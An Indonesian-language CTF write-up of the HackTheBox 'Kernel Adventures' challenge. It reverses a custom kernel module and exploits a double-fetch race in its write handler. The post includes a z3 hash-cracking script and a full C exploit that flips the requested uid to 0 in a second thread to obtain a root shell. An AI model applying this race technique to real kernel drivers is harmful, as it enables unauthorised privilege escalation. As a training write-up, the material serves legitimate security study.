---
layout: post
title: "Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel"
date: 2022-08-26 15:57:28 +0700
---

Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge [hackthebox](www.hackthebox.com). Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.

Spoiler alert! karena instance dari challenge ini masih aktif.

## 0x01 Overview

Kernel exploitation adalah challenge kernel yang mana kita sebagai user biasa harus mendapatkan privilege escalation dengan mengeksploitasi bug yang terdapat pada kernel module yang diberikan. Berikut attachment yang diberikan:

    release/
    ├── bzImage
    ├── notes.txt
    ├── rootfs.cpio.gz
    └── run.sh

Penjelasan singkat mengenai file-file diatas:

- `bzImage` image kernel yang digunakan untuk booting ke sistem operasi. Didalam file ini juga terdapat binary kernel atau biasa disebut `vmlinux`.
- `rootfs.cpio.gz` berisi filesystem image untuk sistem operasi challenge ini.
- `run.sh` bash script yang digunakan untuk menjalankan sistem operasi.

Yang perlu diperhatikan pada kasus ini adalah `rootfs.cpio.gz` karena disinilah file kernel module disimpan yang nantinya akan di-insert ke linux kernel menggunakan `insmod`.

### Extracting Linux Image Filesystem

Ekstraksi filesystem dari image dapat menggunakan perintah `cpio` yang ada di-bash.

    $ gunzip rootfs.cpio.gz && mkdir files
    $ cd files/
    $ cpio -idmv < ../rootfs.cpio
    ...
    $ ls
    bin  etc   home  lib    linuxrc  mnt      opt   root  sbin  tmp  var
    dev  flag  init  lib64  media    mysu.ko  proc  run   sys   usr

`init` adalah file yang akan dieksekusi pertama kali setelah proses booting selesai. `mysu.ko` ini adalah kernel module yang ditambahkan pada kernel. Untuk membaca `flag` diperlukan akses root yang bisa didapatkan dengan meng-eksploitasi kernel module `mysu.ko`. Lainnya adalah filesystem biasa yang terdapat pada linux.

### Kernel Module Structure

Pada kernel module terdapat 2 fungsi utama yaitu `<mod_name>_init` dan `<mod_name>_exit`.

- `<mod_name>_init` ini akan dieksekusi ketika module di-load ke kernel.
- `<mod_name>_exit` ini akan dieksekusi ketika module di-unload dari kernel.

Fungsi lain yang digunakan untuk berinteraksi antara kernel dengan user biasanya berawalan dengan `dev_*`, sebagai contoh `dev_open`, `dev_read`, dan `dev_write`. Dan ketiganya terdapat pada kernel module `mysu`.

## 0x02 Reversing Kernel Module

Dilihat dari `mysu_init`, kernel module akan membuat device pada `/dev/mysu` yang nantinya bisa digunakan untuk berinteraksi dengan user.

```c
unsigned int hash(const char *password)
{
    ...
    idx = 0;
    res = 0;
    password_size = strlen(password);
    while ( idx != password_size )
    {
        tmp = 1025 * (password[idx] + res);
        res = password[idx++] ^ (tmp >> 6) ^ tmp;
    }
    return (unsigned int)res;
}
```

Fungsi `hash` melakukan kalkulasi per-byte password dengan operasi add, mult, shift, dan xor.

```c
unsigned int dev_read(__int64 a1, void *user_buf, unsigned __int64 user_copy_size)
{
    ...
    n = user_copy_size;
    if ( user_copy_size > 0x20 )
        n = 0x20;
    memcpy(user_buf, &users, n);
    return n;
}
```

Fungsi `dev_read` meng-copy `&users` ke `user_buf` sebanyak `user_copy_size` dan panjang request copy tidak bisa lebih dari 32. `&users` ini berisi `uid` dan `hash` dari users dan admin.

```c
unsigned int dev_write(__int64 a1, req_s *req, unsigned __int64 user_write_size)
{
    ...
    if ( user_write_size <= 7 )
        return NULL;

    if ( req->uid == users.uid )
    {
        password = req->password;
        if ( hash(req->password) == users.hash )
            goto SUCCESS;
        if ( admin.uid != req->uid )
            return NULL;
    }
    else if ( admin.uid != req->uid )
    {
        return NULL;
    }

    password = req->password;

    if ( hash(req->password) != admin.hash )
        return NULL;

    SUCCESS:
    uid = req->uid;
    ptr = prepare_creds(password);
    *(_DWORD *)(ptr +  4) = uid;
    *(_DWORD *)(ptr +  8) = uid;
    *(_DWORD *)(ptr + 12) = uid;
    *(_DWORD *)(ptr + 16) = uid;
    *(_DWORD *)(ptr + 20) = uid;
    *(_DWORD *)(ptr + 24) = uid;
    *(_DWORD *)(ptr + 28) = uid;
    *(_DWORD *)(ptr + 32) = uid;
    commit_creds(ptr);
    return user_copy_size;
}
```

Fungsi `dev_write` melakukan perbandingan `req->uid` dan `req->password`’s hash, apakah request user merupakan `users` (uid: 1000) atau `admin` (uid: 1001). Jika semua pengecekan dapat lolos, maka kernel akan memanggil `commit_creds` dengan `cred->uid = req->uid`.

Jika dilihat pada program, kita tidak bisa mengirim request dengan uid 0. Karena pengecekan hanya mengecek apakah user merupakan `users` atau `admin`. Jika tidak keduanya maka return null.

### Bug

Jika dilihat pada `dev_write` setelah seluruh pengecekan selesai, `user->uid` akan di-fetch ke variable lokal `uid` dan akan digunakan untuk meng-assign value uid, gid, dll. dari `struct cred` sebagai argument untuk memanggil `commit_creds`.

```c
if ( req->uid == users.uid )
{
    password = req->password;
    if ( hash(req->password) == users.hash )
        goto SUCCESS;
    if ( admin.uid != req->uid )
        return NULL;
}
else if ( admin.uid != req->uid )
    return NULL;

password = req->password;
if ( hash(req->password) != admin.hash )
    return NULL;

SUCCESS:
uid = req->uid; // fetch
```

Bagaimana jika setelah pengecekan user yang valid selesai, lalu kita mengubah nilai dari `req->uid` tadi pada thread lain? Ini akan menimbulkan inconsistency yang bisa kita manfaatkan untuk mendapatkan `root`.

## 0x03 Exploitation

Jika dilihat dari notes.txt,

> “I removed the password hashes in the file I gave you. They’re not supposed to be 0.”

Author telah menghapus password hash user valid yang terdapat pada `mysu.ko` yang diberikan tadi. Maka diperlukan read terlebih dahulu di-server.

```c
#define MAX_SIZE 4

int main(int *argc, const char **argv[]) {
    int fd;
    int buf[MAX_SIZE];

    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "%s: failed open the device.\n", *argv);
        exit(EXIT_FAILURE);
    }

    read(fd, &buf, sizeof(buf));

    for(int i = 0; i < MAX_SIZE; i++)
        printf("[%02x]: %08x (%d)\n", i, buf[i], buf[i]);

    return 0;
}
```

Jalankan pada server akan didapatkan `uid` dan `hash` password dari `users` dan `admin` yang valid.

```bash
/ $ /tmp/hax
[00]: 000003e8 (1000)
[01]: 03319f75 (53583733)
[02]: 000003e9 (1001)
[03]: 2ab76467 (716661863)
```

### Cracking Hash Password

Tidak tau kenapa, z3 tidak menyelesaikannya secara optimal, sehingga dibutuhkan double check terhadap password yang didapatkan.

```py
from z3 import *

max_uint = 0xFFFFFFFF
max_int  = 0x80000000

def hash(s):
    res = 0
    for i in range(len(s)):
        tmp = (1025 * (s[i] + res)) & max_uint
        res = (s[i] ^ (tmp >> 6) ^ tmp) & max_uint
        res = res | (-(res & max_int))
    return res

target = 0x03319f75 # users
target = 0x2ab76467 # admin
length = 8          # increase if there is no solution by z3.

s = Solver()
b = [BitVec(f'b!{i}', 32) for i in range(length)]

for i in range(len(b)):
    s.add(And(b[i] > 0x20, b[i] < 0x7f))

s.add(hash(b) == target)

while s.check() == sat:
    m = s.model()
    p = bytes([m[i].as_long() for i in b])

    s.add(
        Or(
            b[0] != p[0],
            b[1] != p[1],
            b[2] != p[2],
            b[3] != p[3],
            b[4] != p[4]
        )
    )

    if hash(p) == target:
        print(f"[valid] ({p.hex()}) -> {p}\n")
```

### Attack Ideas

Kita dapat mengubah `req->uid` di-thread lain. Sehingga pada saat pengecekan `req->uid` yang awalnya merupakan uid user biasa dan pengecekan hash password selesai, nilai `req->uid` akan kita ubah menjadi uid root yang nantinya ini akan di-fetch ke variable lokal uid dan digunakan untuk assign `cred` struct untuk `commit_creds`. Sebagai gambaran alur prosesnya.

| Other Thread                     | Main Thread                          |
| -------------------------------- | ------------------------------------ |
| …                                | `req->uid` user valid check          |
| …                                | `req->password` hash valid check     |
| set `req->uid` into 0 (root uid) | uid = `req->uid`                     |
| …                                | cred->uid = 0 and others             |
| …                                | commit_creds(cred) will give us root |

Untuk mengoptimalkan exploit dapat dilakukan race condition untuk mengubah user uid ke root uid, dan break jika sudah mendapatkan root privileged.

Full exploit,

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>

#define _GNU_SOURCE
#define DEVICE_PATH     "/dev/mysu"
#define USER_UID        1000
#define ADMIN_UID       1001
#define USER_PASSWORD   "UeS6Lsp("
#define ADMIN_PASSWORD  "pYH4f5Rb"

struct req_cred_s {
    int uid;
    char password[28];
} req;

void *race_thread() {
    for (;;) req.uid = 0;
}

int main(int *argc, const char **argv[]) {
    pthread_t t_id;
    int fd;

    fd = open(DEVICE_PATH, O_RDWR);

    if (fd < 0) {
        fprintf(stderr, "failed open the device.\n");
        exit(EXIT_FAILURE);
    }

    memcpy(req.password, ADMIN_PASSWORD, sizeof(ADMIN_PASSWORD));

    pthread_create(&t_id, NULL, race_thread, NULL);

    for (;;) {
        req.uid = ADMIN_UID;

        write(fd, &req, sizeof(req));

        if (getuid() == 0) {
            system("/bin/sh");
            break;
        }
    }

    return 0;
}
```

Jalankan di-server dan root didapatkan :)

```bash
/ $ id
uid=1000(user) gid=1000(user) groups=1000(user)
...
/ $ /tmp/hax
/ # id
uid=0(root) gid=0(root) groups=1000(user)
...
/ # cat /flag
HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
/ #
```

## 0x04 Penutup

Pada awalnya bingung dengan multithread di `C` karena agak aneh diawal karena thread tidak jalan bersamaan, ternyata ada yang salah dikode aku. Great challenge! buatku yang baru pertama kali mengerjakan soal kernel exploitation.

Thanks.

[](/2022/08/26/kern-adv-part-1.html)

:helloworld:
